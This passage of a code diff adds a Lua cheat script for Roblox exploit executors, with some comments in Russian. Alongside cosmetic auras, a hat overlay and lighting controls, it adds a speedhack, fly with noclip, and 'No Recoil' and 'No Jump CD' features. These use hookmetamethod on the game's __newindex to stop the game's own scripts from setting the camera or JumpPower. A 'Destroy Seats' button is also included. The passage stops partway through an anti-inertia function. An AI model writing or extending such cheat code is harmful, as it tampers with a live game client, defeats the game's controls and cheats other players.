+    swirlEmitter.SpreadAngle, swirlEmitter.VelocitySpread, swirlEmitter.Size, swirlEmitter.Transparency = Vector2.new(-360, 360), -360, NumberSequence.new({NumberSequenceKeypoint.new(0, SphereAuraSettings.size), NumberSequenceKeypoint.new(1, SphereAuraSettings.size)}), NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.5006, 0.5), NumberSequenceKeypoint.new(1, 1)})
+    swirlEmitter.Color, swirlEmitter.LightEmission, swirlEmitter.ZOffset, swirlEmitter.Orientation, swirlEmitter.LockedToPart, swirlEmitter.Parent = ColorSequence.new({ColorSequenceKeypoint.new(0, SphereAuraSettings.color1), ColorSequenceKeypoint.new(1, SphereAuraSettings.color2)}), SphereAuraSettings.lightEmission, -1, Enum.ParticleOrientation.VelocityPerpendicular, true, attachment
+    currentAura = auraBase
+end
+
+local function applyPlayerAura()
+    local character = LP.Character
+    if not character then
+        local characterAddedConnection
+        if characterAddedConnection then characterAddedConnection:Disconnect() end
+        characterAddedConnection = LP.CharacterAdded:Connect(function(newCharacter)
+            if SphereAuraSettings.enabled then createPlayerAura(newCharacter) end
+        end)
+        return
+    end
+    createPlayerAura(character)
+    if not characterAddedConnection then
+        local characterAddedConnection
+        characterAddedConnection = LP.CharacterAdded:Connect(function(newCharacter)
+            if SphereAuraSettings.enabled then createPlayerAura(newCharacter) end
+        end)
+    end
+end
+
+getgenv().GetSphereAuraSettings = function() return SphereAuraSettings end
+
+local SphereAuraGroup = Tabs.Visuals:AddRightGroupbox('>_<')
+SphereAuraGroup:AddToggle('SphereAura', {
+    Text = 'SphereAura',
+    Default = false,
+    Callback = function(v)
+        SphereAuraSettings.enabled = v
+        if v then
+            applyPlayerAura()
+        else
+            removePlayerAura()
+        end
+    end
+}):AddColorPicker('SphereAuraColor1', {
+    Default = SphereAuraSettings.color1,
+    Title = 'Color 1',
+    Callback = function(val)
+        SphereAuraSettings.color1 = val
+        updateAura("color")
+    end
+}):AddColorPicker('SphereAuraColor2', {
+    Default = SphereAuraSettings.color2,
+    Title = 'Color 2',
+    Callback = function(val)
+        SphereAuraSettings.color2 = val
+        updateAura("color")
+    end
+})
+
+local SphereAuraSub = SphereAuraGroup:AddDependencyBox()
+SphereAuraSub:AddSlider('SphereAuraSize', {
+    Text = 'Size',
+    Default = SphereAuraSettings.size,
+    Min = 1,
+    Max = 50,
+    Rounding = 1,
+    Callback = function(val)
+        SphereAuraSettings.size = val
+        updateAura("size")
+    end
+})
+SphereAuraSub:AddSlider('SphereAuraLightEmission', {
+    Text = 'LightEmission',
+    Default = SphereAuraSettings.lightEmission,
+    Min = 0,
+    Max = 2,
+    Rounding = 2,
+    Callback = function(val)
+        SphereAuraSettings.lightEmission = val
+        updateAura("light")
+    end
+})
+SphereAuraSub:SetupDependencies({{Toggles.SphereAura, true}})
+
+-- CircleAura UI и логика
+local CircleAuraSettings = {
+    enabled = false,
+    beamColor = Color3.new(1, 1, 1),
+    circleColor = Color3.new(1, 1, 1),
+    lightEmission = 0.8,
+    circleTexture = "rbxassetid://8920246243"
+}
+local currentCircleAura
+
+local function removeCircleAura()
+    if currentCircleAura and currentCircleAura.Parent then currentCircleAura:Destroy() end
+    currentCircleAura = nil
+end
+
+local function updateCircleAura(prop)
+    if not (currentCircleAura and currentCircleAura.Parent) then return end
+    for _, obj in pairs(currentCircleAura:GetDescendants()) do
+        if (prop == nil or prop == "beamColor") and obj:IsA("Beam") then
+            obj.Color = ColorSequence.new(CircleAuraSettings.beamColor)
+        end
+        if (prop == nil or prop == "circleColor") and obj:IsA("ParticleEmitter") and obj.Name == "Circle" then
+            obj.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, CircleAuraSettings.circleColor), ColorSequenceKeypoint.new(1, CircleAuraSettings.circleColor)})
+        end
+        if (prop == nil or prop == "lightEmission") and (obj:IsA("Beam") or obj:IsA("ParticleEmitter")) then
+            obj.LightEmission = CircleAuraSettings.lightEmission
+        end
+        if (prop == nil or prop == "circleTexture") and obj:IsA("ParticleEmitter") and obj.Name == "Circle" then
+            obj.Texture = CircleAuraSettings.circleTexture
+        end
+    end
+end
+
+local function createCircleAura(character)
+    removeCircleAura()
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 3)
+    if not humanoidRootPart then return end
+    local auraBase = Instance.new("Part")
+    auraBase.Size, auraBase.Transparency, auraBase.Anchored, auraBase.CanCollide, auraBase.Name, auraBase.Parent = Vector3.new(1, 1, 1), 1, true, false, "CircleAuraBase", S.WS
+    auraBase.CFrame = CFrame.new(humanoidRootPart.Position) * CFrame.new(0, -0.15, 0)
+    local positionUpdateConnection
+    positionUpdateConnection = HRT:Connect(function()
+        if humanoidRootPart and humanoidRootPart.Parent and auraBase and auraBase.Parent then
+            auraBase.CFrame = CFrame.new(humanoidRootPart.Position) * CFrame.new(0, -0.15, 0)
+        else
+            if positionUpdateConnection then positionUpdateConnection:Disconnect() end
+        end
+    end)
+    auraBase.AncestryChanged:Connect(function() if not auraBase.Parent and positionUpdateConnection then positionUpdateConnection:Disconnect() end end)
+
+    local mainAttachment = Instance.new("Attachment")
+    mainAttachment.Name, mainAttachment.Position, mainAttachment.Parent = "Main", Vector3.new(0, -2.75, 0), auraBase
+    local circleEmitter = Instance.new("ParticleEmitter")
+    circleEmitter.Name, circleEmitter.Texture, circleEmitter.Lifetime, circleEmitter.Rate, circleEmitter.RotSpeed, circleEmitter.Speed = "Circle", CircleAuraSettings.circleTexture, NumberRange.new(9), 0.333, NumberRange.new(120), NumberRange.new(0.001)
+    circleEmitter.Size, circleEmitter.Transparency, circleEmitter.Color, circleEmitter.LightEmission, circleEmitter.ZOffset, circleEmitter.Orientation, circleEmitter.LockedToPart, circleEmitter.Parent = NumberSequence.new({NumberSequenceKeypoint.new(0, 3), NumberSequenceKeypoint.new(1, 3)}), NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1, 0), NumberSequenceKeypoint.new(0.5, 0), NumberSequenceKeypoint.new(0.6256, 0.0875), NumberSequenceKeypoint.new(0.7691, 0.3875), NumberSequenceKeypoint.new(0.8677, 0.7125), NumberSequenceKeypoint.new(0.9230, 0.875), NumberSequenceKeypoint.new(0.9552, 0.9375), NumberSequenceKeypoint.new(1, 0.975)}), ColorSequence.new({ColorSequenceKeypoint.new(0, CircleAuraSettings.circleColor), ColorSequenceKeypoint.new(1, CircleAuraSettings.circleColor)}), CircleAuraSettings.lightEmission, 0.05, Enum.ParticleOrientation.VelocityPerpendicular, true, mainAttachment
+
+    local attachOne, attachTwo = Instance.new("Attachment"), Instance.new("Attachment")
+    attachOne.Name, attachOne.Position, attachOne.Parent = "One", Vector3.new(0, -2.8, 2.6), auraBase
+    attachTwo.Name, attachTwo.Position, attachTwo.Parent = "Two", Vector3.new(0, -2.8, -2.6), auraBase
+    local beamOne = Instance.new("Beam")
+    beamOne.Name, beamOne.Texture, beamOne.TextureSpeed, beamOne.TextureLength, beamOne.Width0, beamOne.Width1, beamOne.CurveSize0, beamOne.CurveSize1, beamOne.Segments, beamOne.LightEmission, beamOne.Transparency, beamOne.Color, beamOne.Attachment0, beamOne.Attachment1, beamOne.Parent = "One", "rbxassetid://8920073892", -0.3, 0.5, 4, 4, -3.5, 3.5, 25, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3), NumberSequenceKeypoint.new(1, 0.3)}), ColorSequence.new(CircleAuraSettings.beamColor), attachOne, attachTwo, auraBase
+    local beamTwo = Instance.new("Beam")
+    beamTwo.Name, beamTwo.Texture, beamTwo.TextureSpeed, beamTwo.TextureLength, beamTwo.Width0, beamTwo.Width1, beamTwo.CurveSize0, beamTwo.CurveSize1, beamTwo.Segments, beamTwo.LightEmission, beamTwo.Transparency, beamTwo.Color, beamTwo.Attachment0, beamTwo.Attachment1, beamTwo.Parent = "Two", "rbxassetid://8920073892", 0.3, 0.5, 4, 4, 3.5, -3.5, 25, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3), NumberSequenceKeypoint.new(1, 0.3)}), ColorSequence.new(CircleAuraSettings.beamColor), attachOne, attachTwo, auraBase
+
+    local attachThree, attachFour = Instance.new("Attachment"), Instance.new("Attachment")
+    attachThree.Name, attachThree.Position, attachThree.Parent = "Three", Vector3.new(0, -2.7, 0), auraBase
+    attachFour.Name, attachFour.Position, attachFour.Parent = "Four", Vector3.new(0, 6, 0), auraBase
+    local beamThree = Instance.new("Beam")
+    beamThree.Name, beamThree.Texture, beamThree.TextureSpeed, beamThree.TextureLength, beamThree.Width0, beamThree.Width1, beamThree.Segments, beamThree.LightEmission, beamThree.Transparency, beamThree.Color, beamThree.FaceCamera, beamThree.Attachment0, beamThree.Attachment1, beamThree.Parent = "Three", "rbxassetid://9020147050", 0.3, 0.1, 5, 6, 5, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1, 1), NumberSequenceKeypoint.new(0.4, 0.4), NumberSequenceKeypoint.new(1, 1)}), ColorSequence.new(CircleAuraSettings.beamColor), true, attachThree, attachFour, auraBase
+    local beamFour = Instance.new("Beam")
+    beamFour.Name, beamFour.Texture, beamFour.TextureSpeed, beamFour.TextureLength, beamFour.Width0, beamFour.Width1, beamFour.Segments, beamFour.LightEmission, beamFour.Transparency, beamFour.Color, beamFour.FaceCamera, beamFour.Attachment0, beamFour.Attachment1, beamFour.Parent = "Four", "rbxassetid://8984452855", 0.06, 0.4, 5, 6, 5, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3), NumberSequenceKeypoint.new(1, 1)}), ColorSequence.new(CircleAuraSettings.beamColor), true, attachThree, attachFour, auraBase
+    local beamFive = Instance.new("Beam")
+    beamFive.Name, beamFive.Texture, beamFive.TextureSpeed, beamFive.TextureLength, beamFive.Width0, beamFive.Width1, beamFive.Segments, beamFive.LightEmission, beamFive.Transparency, beamFive.Color, beamFive.FaceCamera, beamFive.Attachment0, beamFive.Attachment1, beamFive.Parent = "Five", "http://www.roblox.com/asset/?id=4390493166", 0.2, 0.15, 4, 4, 5, CircleAuraSettings.lightEmission, NumberSequence.new({NumberSequenceKeypoint.new(0, 0.3), NumberSequenceKeypoint.new(1, 1)}), ColorSequence.new(CircleAuraSettings.beamColor), true, attachThree, attachFour, auraBase
+
+    currentCircleAura = auraBase
+end
+
+local function applyCircleAura()
+    local character = LP.Character
+    if not character then
+        local circleAuraConnection
+        if circleAuraConnection then circleAuraConnection:Disconnect() end
+        circleAuraConnection = LP.CharacterAdded:Connect(function(newCharacter)
+            if CircleAuraSettings.enabled then createCircleAura(newCharacter) end
+        end)
+        return
+    end
+    createCircleAura(character)
+    if not circleAuraConnection then
+        local circleAuraConnection
+        circleAuraConnection = LP.CharacterAdded:Connect(function(newCharacter)
+            if CircleAuraSettings.enabled then createCircleAura(newCharacter) end
+        end)
+    end
+end
+
+getgenv().GetCircleAuraSettings = function() return CircleAuraSettings end
+
+-- UI
+SphereAuraGroup:AddToggle('CircleAura', {
+    Text = 'CircleAura',
+    Default = false,
+    Callback = function(v)
+        CircleAuraSettings.enabled = v
+        if v then
+            applyCircleAura()
+        else
+            removeCircleAura()
+        end
+    end
+}):AddColorPicker('CircleAuraBeamColor', {
+    Default = CircleAuraSettings.beamColor,
+    Title = 'Beam Color',
+    Callback = function(val)
+        CircleAuraSettings.beamColor = val
+        updateCircleAura('beamColor')
+    end
+}):AddColorPicker('CircleAuraCircleColor', {
+    Default = CircleAuraSettings.circleColor,
+    Title = 'Circle Color',
+    Callback = function(val)
+        CircleAuraSettings.circleColor = val
+        updateCircleAura('circleColor')
+    end
+})
+
+local CircleAuraSub = SphereAuraGroup:AddDependencyBox()
+CircleAuraSub:AddSlider('CircleAuraLightEmission', {
+    Text = 'LightEmission',
+    Default = CircleAuraSettings.lightEmission,
+    Min = 0,
+    Max = 2,
+    Rounding = 2,
+    Callback = function(val)
+        CircleAuraSettings.lightEmission = val
+        updateCircleAura('lightEmission')
+    end
+})
+CircleAuraSub:AddDropdown('CircleAuraCircleTexture', {
+    Text = 'Circle Texture',
+    Values = {
+        '8920246243',
+        '10365549270',
+        '5726444189',
+        '1266170131',
+        '12363692255',
+        '12363692920',
+    },
+    Default = '8920246243',
+    Callback = function(val)
+        CircleAuraSettings.circleTexture = 'rbxassetid://' .. val
+        updateCircleAura('circleTexture')
+    end
+})
+CircleAuraSub:SetupDependencies({{Toggles.CircleAura, true}})
+
+-- ChinaHat UI и логика
+local ChinaHatSettings = {
+    enabled = false,
+    minCameraDistance = 1,
+    hatTransparency = 0.35,
+    circleTransparency = 1,
+    height = 0.75,
+    radius = 5,
+    sides = 25,
+    rainbow = false,
+    color = Color3.fromRGB(255, 255, 255),
+    offset = Vector3.new(0, 0.75, 0)
+}
+
+local ChinaHatGroup = Tabs.Visuals:AddLeftGroupbox('>_<')
+ChinaHatGroup:AddToggle('ChinaHatEnabled', {
+    Text = 'ChinaHat',
+    Default = ChinaHatSettings.enabled,
+    Callback = function(v)
+        ChinaHatSettings.enabled = v
+    end
+}):AddColorPicker('ChinaHatColor', {
+    Default = ChinaHatSettings.color,
+    Title = 'Color',
+    Callback = function(val)
+        ChinaHatSettings.color = val
+    end
+})
+ChinaHatGroup:AddSlider('ChinaHatHeight', {
+    Text = 'Height',
+    Default = ChinaHatSettings.height,
+    Min = 0.1,
+    Max = 3,
+    Rounding = 2,
+    Callback = function(val)
+        ChinaHatSettings.height = val
+    end
+})
+ChinaHatGroup:AddSlider('ChinaHatRadius', {
+    Text = 'Radius',
+    Default = ChinaHatSettings.radius,
+    Min = 1,
+    Max = 10,
+    Rounding = 2,
+    Callback = function(val)
+        ChinaHatSettings.radius = val
+    end
+})
+ChinaHatGroup:AddToggle('ChinaHatRainbow', {
+    Text = 'Rainbow',
+    Default = ChinaHatSettings.rainbow,
+    Callback = function(v)
+        ChinaHatSettings.rainbow = v
+    end
+})
+
+-- ChinaHat rendering logic
+local ChinaHatDrawings = {}
+local tau = math.pi * 2
+for i = 1, ChinaHatSettings.sides do
+    ChinaHatDrawings[i] = {Drawing.new('Line'), Drawing.new('Triangle')}
+    ChinaHatDrawings[i][1].ZIndex = 2
+    ChinaHatDrawings[i][1].Thickness = 2
+    ChinaHatDrawings[i][2].ZIndex = 1
+    ChinaHatDrawings[i][2].Filled = true
+end
+
+RND:Connect(function()
+    local pass = ChinaHatSettings.enabled and LP.Character and LP.Character:FindFirstChild('Head') and (Cam.CFrame.p - Cam.Focus.p).magnitude > ChinaHatSettings.minCameraDistance and LP.Character:FindFirstChildOfClass('Humanoid') and LP.Character:FindFirstChildOfClass('Humanoid').Health > 0
+    for i = 1, #ChinaHatDrawings do
+        local line, triangle = ChinaHatDrawings[i][1], ChinaHatDrawings[i][2]
+        if pass then
+            local color = ChinaHatSettings.rainbow and Color3.fromHSV((tick() % 5 / 5 - (i / #ChinaHatDrawings)) % 1, 0.5, 1) or ChinaHatSettings.color
+            local pos = LP.Character.Head.Position + ChinaHatSettings.offset
+            local topWorld = pos + Vector3.new(0, ChinaHatSettings.height, 0)
+            local last, next = (i / ChinaHatSettings.sides) * tau, ((i + 1) / ChinaHatSettings.sides) * tau
+            local lastWorld = pos + (Vector3.new(math.cos(last), 0, math.sin(last)) * ChinaHatSettings.radius)
+            local nextWorld = pos + (Vector3.new(math.cos(next), 0, math.sin(next)) * ChinaHatSettings.radius)
+            local lastScreen = Cam:WorldToViewportPoint(lastWorld)
+            local nextScreen = Cam:WorldToViewportPoint(nextWorld)
+            local topScreen = Cam:WorldToViewportPoint(topWorld)
+            line.From = Vector2.new(lastScreen.X, lastScreen.Y)
+            line.To = Vector2.new(nextScreen.X, nextScreen.Y)
+            line.Color = color
+            line.Transparency = ChinaHatSettings.circleTransparency
+            line.Visible = true
+            triangle.PointA = Vector2.new(topScreen.X, topScreen.Y)
+            triangle.PointB = line.From
+            triangle.PointC = line.To
+            triangle.Color = color
+            triangle.Transparency = ChinaHatSettings.hatTransparency
+            triangle.Visible = true
+        else
+            line.Visible = false
+            triangle.Visible = false
+        end
+    end
+end)
+
+-- === World Controller UI (LEFT) ===
+local WorldGroup = Tabs.Visuals:AddLeftGroupbox('>_<')
+
+local Lighting = S.LS
+local function ensureCC()
+    local cc = Lighting:FindFirstChildOfClass('ColorCorrectionEffect')
+    if not cc then
+        cc = Instance.new('ColorCorrectionEffect')
+        cc.Parent = Lighting
+        cc.Enabled = true
+    end
+    return cc
+end
+local cc = ensureCC()
+
+local WorldConfig = {
+    FogEnabled = false,
+    FogColor = Color3.new(1,1,1),
+    FogStart = Lighting.FogStart or 0,
+    FogEnd = Lighting.FogEnd or 100,
+    Shadows = false,
+    ShadowColor = Lighting.ShadowColor or Color3.new(0,0,0),
+    Time = Lighting.ClockTime or 12,
+    Saturation = cc.Saturation or 0,
+    Brightness = cc.Brightness or 0
+}
+
+local function applyWorld()
+    if WorldConfig.FogEnabled then
+        Lighting.FogStart = WorldConfig.FogStart
+        Lighting.FogEnd = WorldConfig.FogEnd
+        Lighting.FogColor = WorldConfig.FogColor
+    else
+        Lighting.FogStart = 1e6
+        Lighting.FogEnd = 1e6
+        -- Не трогаем Lighting.FogColor
+    end
+    Lighting.GlobalShadows = WorldConfig.Shadows
+    Lighting.ShadowColor = WorldConfig.ShadowColor
+    Lighting.ClockTime = WorldConfig.Time
+    local cc = ensureCC()
+    cc.Saturation = WorldConfig.Saturation
+    cc.Brightness = WorldConfig.Brightness
+end
+
+local FogToggle = WorldGroup:AddToggle('FogEnabled', {
+    Text = 'Fog',
+    Default = false,
+    Callback = function(v) WorldConfig.FogEnabled = v; applyWorld() end
+})
+FogToggle:AddColorPicker('FogColor', {
+    Default = Color3.new(1,1,1),
+    Title = 'Col',
+    Callback = function(val) WorldConfig.FogColor = val; applyWorld() end
+})
+WorldGroup:AddSlider('FogStart', {
+    Text = 'FStart',
+    Default = WorldConfig.FogStart,
+    Min = 0, Max = 10000, Rounding = 1,
+    Callback = function(val) WorldConfig.FogStart = val; applyWorld() end
+})
+WorldGroup:AddSlider('FogEnd', {
+    Text = 'FEnd',
+    Default = WorldConfig.FogEnd,
+    Min = 0, Max = 10000, Rounding = 1,
+    Callback = function(val) WorldConfig.FogEnd = val; applyWorld() end
+})
+local ShadowsToggle = WorldGroup:AddToggle('Shadows', {
+    Text = 'Shadows',
+    Default = false,
+    Callback = function(v) WorldConfig.Shadows = v; applyWorld() end
+})
+WorldGroup:AddSlider('Time', {
+    Text = 'Time',
+    Default = WorldConfig.Time,
+    Min = 0, Max = 24, Rounding = 1,
+    Callback = function(val) WorldConfig.Time = val; applyWorld() end
+})
+WorldGroup:AddSlider('Saturation', {
+    Text = 'Sat',
+    Default = WorldConfig.Saturation,
+    Min = -1, Max = 1, Rounding = 1,
+    Callback = function(val) WorldConfig.Saturation = val; applyWorld() end
+})
+WorldGroup:AddSlider('Brightness', {
+    Text = 'Brt',
+    Default = WorldConfig.Brightness,
+    Min = -1, Max = 1, Rounding = 1,
+    Callback = function(val) WorldConfig.Brightness = val; applyWorld() end
+})
+
+-- === LightingType Controller (RIGHT) ===
+local LightingTypeGroup = Tabs.Visuals:AddRightGroupbox('>_<')
+local LightingTypeList = {"Voxel", "ShadowMap", "Future"}
+local LightingTypeEnum = {
+    Voxel = Enum.Technology.Voxel,
+    ShadowMap = Enum.Technology.ShadowMap,
+    Future = Enum.Technology.Future
+}
+LightingTypeGroup:AddDropdown('LightingType', {
+    Text = 'LightingType',
+    Values = LightingTypeList,
+    Default = 'Voxel',
+    Callback = function(val)
+        local tech = LightingTypeEnum[val]
+        if tech then
+            S.LS.Technology = tech
+        end
+    end
+})
+-- При запуске выставить первый режим
+S.LS.Technology = LightingTypeEnum[LightingTypeList[1]]
+
+-- === Speedhack (Player tab, right) ===
+local SpeedhackGroup = Tabs.Player:AddRightGroupbox('>_<')
+local SpeedhackConfig = {
+    Enabled = false, -- toggle
+    Active = false,  -- keybind
+    Speed = 50
+}
+local speedHackConnection
+local function updateSpeedHack(character)
+    if not character then return end
+    local rootPart = character:WaitForChild('HumanoidRootPart')
+    local humanoid = character:WaitForChild('Humanoid')
+    if speedHackConnection then speedHackConnection:Disconnect() end
+    speedHackConnection = HRT:Connect(function(dt)
+        if SpeedhackConfig.Enabled and SpeedhackConfig.Active then
+            local move = humanoid.MoveDirection
+            if move.Magnitude > 0 then
+                rootPart.CFrame = rootPart.CFrame + (move.Unit * SpeedhackConfig.Speed * dt)
+            end
+        end
+    end)
+end
+SpeedhackGroup:AddToggle('SpeedhackEnabled', {
+    Text = 'Speedhack',
+    Default = false,
+    Callback = function(v)
+        SpeedhackConfig.Enabled = v
+        if v then
+            updateSpeedHack(LP.Character)
+        else
+            SpeedhackConfig.Active = false
+            if speedHackConnection then speedHackConnection:Disconnect() speedHackConnection = nil end
+        end
+    end
+})
+:AddKeyPicker('SpeedhackKey', {
+    Default = 'None',
+    Text = 'Speedhack',
+    NoUI = false,
+    Callback = function()
+        if not SpeedhackConfig.Enabled then return end
+        SpeedhackConfig.Active = not SpeedhackConfig.Active
+    end
+})
+
+local speedInput = SpeedhackGroup:AddInput('SpeedhackSpeedBox', {
+    Text = 'Speed',
+    Default = tostring(SpeedhackConfig.Speed),
+    Numeric = true,
+    Finished = true,
+    Callback = function(val)
+        local num = tonumber(val)
+        if num then
+            num = math.clamp(num, 1, 2000000)
+            SpeedhackConfig.Speed = num
+        end
+    end
+})
+
+LP.CharacterAdded:Connect(function(char)
+    if SpeedhackConfig.Enabled then
+        updateSpeedHack(char)
+    end
+end)
+
+-- === Fly (Player tab, left) ===
+local FlyGroup = Tabs.Player:AddLeftGroupbox('>_<')
+local FlyConfig = {
+    Enabled = false, -- toggle (мастер)
+    Active = false,  -- keybind (активность)
+    Speed = 1,       -- множитель (1x = 50 studs/sec)
+    Keybind = Enum.KeyCode.F
+}
+local FlyLoop = nil
+local function setNoClip(character, state)
+    if not character then return end
+    for _, part in ipairs(character:GetDescendants()) do
+        if part:IsA('BasePart') then
+            if state then
+                if not part:GetAttribute('OriginalCollision') then
+                    part:SetAttribute('OriginalCollision', part.CanCollide)
+                    part:SetAttribute('OriginalTouch', part.CanTouch)
+                    if part:GetAttribute('CanQuery') ~= nil then
+                        part:SetAttribute('OriginalQuery', part.CanQuery)
+                    end
+                end
+                part.CanCollide = false
+                part.CanTouch = false
+                part.CanQuery = false
+            else
+                if part:GetAttribute('OriginalCollision') ~= nil then
+                    part.CanCollide = part:GetAttribute('OriginalCollision')
+                    part.CanTouch = part:GetAttribute('OriginalTouch')
+                    if part:GetAttribute('OriginalQuery') ~= nil then
+                        part.CanQuery = part:GetAttribute('OriginalQuery')
+                    end
+                    part:SetAttribute('OriginalCollision', nil)
+                    part:SetAttribute('OriginalTouch', nil)
+                    part:SetAttribute('OriginalQuery', nil)
+                end
+            end
+        end
+    end
+end
+local function updateFly(character)
+    if FlyLoop then FlyLoop:Disconnect() FlyLoop = nil end
+    if not character then return end
+    if not (FlyConfig.Enabled and FlyConfig.Active) then return end
+    setNoClip(character, true)
+    FlyLoop = SND:Connect(function()
+        local char = LP.Character
+        if not char then return end
+        setNoClip(char, true)
+        local hrp = char:FindFirstChild('HumanoidRootPart')
+        local hum = char:FindFirstChild('Humanoid')
+        if not hrp or not hum then return end
+        local speed = FlyConfig.Speed * 50
+        local velocity = Vector3.new(0, 0, 0)
+        if S.UIS:IsKeyDown(Enum.KeyCode.Space) then velocity = velocity + Vector3.new(0, speed, 0) end
+        if S.UIS:IsKeyDown(Enum.KeyCode.LeftControl) then velocity = velocity + Vector3.new(0, -speed, 0) end
+        if S.UIS:IsKeyDown(Enum.KeyCode.W) then velocity = velocity + (Cam.CFrame.LookVector * speed) end
+        if S.UIS:IsKeyDown(Enum.KeyCode.A) then velocity = velocity + (Cam.CFrame.RightVector * -speed) end
+        if S.UIS:IsKeyDown(Enum.KeyCode.S) then velocity = velocity + (Cam.CFrame.LookVector * -speed) end
+        if S.UIS:IsKeyDown(Enum.KeyCode.D) then velocity = velocity + (Cam.CFrame.RightVector * speed) end
+        hrp.Velocity = velocity
+        hum:ChangeState('Freefall')
+    end)
+end
+local function stopFly()
+    if FlyLoop then FlyLoop:Disconnect() FlyLoop = nil end
+    local char = LP.Character
+    setNoClip(char, false)
+    if char then
+        local hrp = char:FindFirstChild('HumanoidRootPart')
+        local hum = char:FindFirstChild('Humanoid')
+        if hrp then
+            hrp.Velocity = Vector3.new(0, -2, 0)
+            local tempConn
+            tempConn = SND:Connect(function()
+                if not hrp or not hrp.Parent then tempConn:Disconnect() return end
+                hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0)
+                tempConn:Disconnect()
+            end)
+        end
+        if hum then hum:ChangeState('Landing') end
+    end
+end
+local function setFlyActive(state)
+    FlyConfig.Active = state
+    if FlyConfig.Enabled and FlyConfig.Active then
+        updateFly(LP.Character)
+    else
+        stopFly()
+    end
+end
+FlyGroup:AddToggle('FlyEnabled', {
+    Text = 'Fly',
+    Default = false,
+    Callback = function(v)
+        FlyConfig.Enabled = v
+        if not v then
+            setFlyActive(false)
+        end
+        if v and FlyConfig.Active then
+            updateFly(LP.Character)
+        end
+    end
+})
+:AddKeyPicker('FlyKey', {
+    Default = 'None',
+    Text = 'Fly',
+    NoUI = false,
+    Callback = function()
+        if not FlyConfig.Enabled then return end
+        setFlyActive(not FlyConfig.Active)
+    end
+})
+FlyGroup:AddInput('FlySpeed', {
+    Text = 'Speed',
+    Default = tostring(FlyConfig.Speed),
+    Numeric = true,
+    Finished = true,
+    Callback = function(val)
+        local num = tonumber(val)
+        if num then
+            num = math.clamp(num, 0.1, 100)
+            FlyConfig.Speed = num
+        end
+    end
+})
+LP.CharacterAdded:Connect(function(char)
+    if FlyConfig.Enabled and FlyConfig.Active then
+        updateFly(char)
+    end
+end)
+
+-- === NoRecoil (Misc tab, отдельная секция) ===
+local NoRecoilGroup = Tabs.Misc:AddLeftGroupbox('>_<')
+
+local noRecoilHook, originalNewIndex
+local noRecoilEnabled = false
+
+local function isframework(scriptInstance)
+    return tostring(scriptInstance) == "Framework"
+end
+
+local function checkArgs(instance, index)
+    return tostring(instance):lower():find("camera") and tostring(index) == "CFrame"
+end
+
+local function enableNoRecoil()
+    if noRecoilHook then return end
+    originalNewIndex = originalNewIndex or hookmetamethod(game, "__newindex", function(self, index, value)
+        local callingScr = getcallingscript and getcallingscript() or nil
+        if callingScr and isframework(callingScr) and checkArgs(self, index) then
+            return
+        end
+        return originalNewIndex(self, index, value)
+    end)
+    noRecoilHook = true
+end
+
+local function disableNoRecoil()
+    if not noRecoilHook then return end
+    -- Снимаем хук: возвращаем оригинальный __newindex
+    if originalNewIndex then
+        hookmetamethod(game, "__newindex", originalNewIndex)
+    end
+    noRecoilHook = nil
+end
+
+NoRecoilGroup:AddToggle('No Recoil', {
+    Text = 'No Recoil',
+    Default = false,
+    Callback = function(v)
+        noRecoilEnabled = v
+        if v then
+            enableNoRecoil()
+        else
+            disableNoRecoil()
+        end
+    end,
+    Tooltip = 'Removes camera recoil (Framework)'
+})
+
+-- === NoJumpCD (Misc tab, правая секция) ===
+local NoJumpCDGroup = Tabs.Misc:AddRightGroupbox('>_<')
+
+local noJumpCDHook, originalNewIndexJump, currentNoJumpCDHook
+local noJumpCDEnabled = false
+
+local function enableNoJumpCD()
+    if noJumpCDHook then return end
+    local IsA = game.IsA
+    -- Сохраняем оригинальный только один раз
+    if not originalNewIndexJump then
+        originalNewIndexJump = hookmetamethod(game, "__newindex", function(self, Index, Value)
+            return originalNewIndexJump(self, Index, Value)
+        end)
+    end
+    -- Ставим кастомный хук, всегда используя оригинальный
+    currentNoJumpCDHook = hookmetamethod(game, "__newindex", function(self, Index, Value)
+        if not checkcaller() and IsA(self, "Humanoid") and Index == "JumpPower" then
+            return
+        end
+        return originalNewIndexJump(self, Index, Value)
+    end)
+    noJumpCDHook = true
+end
+
+local function disableNoJumpCD()
+    if not noJumpCDHook then return end
+    if originalNewIndexJump then
+        hookmetamethod(game, "__newindex", originalNewIndexJump)
+    end
+    noJumpCDHook = nil
+    currentNoJumpCDHook = nil
+end
+
+NoJumpCDGroup:AddToggle('No Jump CD', {
+    Text = 'No Jump CD',
+    Default = false,
+    Callback = function(v)
+        noJumpCDEnabled = v
+        if v then
+            enableNoJumpCD()
+        else
+            disableNoJumpCD()
+        end
+    end,
+    Tooltip = 'Removes jump cooldown (blocks JumpPower set)'
+})
+
+NoJumpCDGroup:AddButton({
+    Text = 'Destroy Seats',
+    Func = function()
+        local count = 0
+        for _, obj in ipairs(S.WS:GetDescendants()) do
+            if obj:IsA('Seat') or obj:IsA('VehicleSeat') then
+                obj:Destroy()
+                count = count + 1
+            end
+        end
+        Library:Notify('Destroyed seats: ' .. count, 3)
+    end,
+    Tooltip = 'Remove all seats (Seat/VehicleSeat) in the game'
+})
+
+-- === AntiInertia (Misc tab, отдельная правая секция) ===
+local AntiInertiaGroup = Tabs.Misc:AddRightGroupbox('>_<')
+
+local AntiInertiaSettings = {
+    Enabled = false,
+    Speed = {
+        Ground = 0.3,
+        Air = 0.3
+    },
+    NoInertia = true
+}
+
+local antiInertiaConnection = nil
+
+local function ToggleAntiInertia(state)
+    AntiInertiaSettings.Enabled = state
+    if antiInertiaConnection then
+        antiInertiaConnection:Disconnect()
+        antiInertiaConnection = nil
+    end
+    if state then
+        antiInertiaConnection = HRT:Connect(function()
+            if not AntiInertiaSettings.Enabled then return end
+            local character = LP.Character
+            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
